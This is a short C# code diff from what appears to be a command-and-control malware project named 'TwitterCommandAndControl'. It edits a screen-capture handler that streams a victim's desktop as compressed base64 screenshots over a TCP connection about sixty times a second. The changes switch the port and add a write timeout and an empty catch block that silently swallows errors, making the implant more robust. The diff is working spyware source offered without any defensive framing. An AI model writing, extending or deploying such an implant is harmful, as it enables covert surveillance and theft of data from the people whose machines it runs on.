@@ -15,7 +15,7 @@ namespace TwitterCommandAndControl
 {
     public static class ScreenCaptureHandler
     {
-        private const int PORT = 7777;
+        private const int PORT = 8888;
         public static void Respond(string command)
         {
             NetworkStream networkStream = null;
@@ -33,17 +33,22 @@ namespace TwitterCommandAndControl
                         using (var gzipStream = new GZipStream(networkStream, CompressionMode.Compress))
                         using (var writer = new StreamWriter(gzipStream))
                         {
-                            while (tcpClient.Connected)
+                            networkStream.WriteTimeout = 500;
+                            try
                             {
-                                using (var image = CaptureScreen.GetDesktopImage())
-                                using (var memoryStream = new MemoryStream())
+                                while (tcpClient.Connected)
                                 {
-                                    image.Save(memoryStream, System.Drawing.Imaging.ImageFormat.Png);
-                                    writer.WriteLine(System.Convert.ToBase64String(memoryStream.ToArray()));
-                                    writer.Flush();
+                                    using (var image = CaptureScreen.GetDesktopImage())
+                                    using (var memoryStream = new MemoryStream())
+                                    {
+                                        image.Save(memoryStream, System.Drawing.Imaging.ImageFormat.Png);
+                                        writer.WriteLine(System.Convert.ToBase64String(memoryStream.ToArray()));
+                                        writer.Flush();
+                                    }
+                                    Thread.Sleep(1000 / 60);
                                 }
-                                Thread.Sleep(1000 / 60);
                             }
+                            catch { }
                         }
                     }
                 }
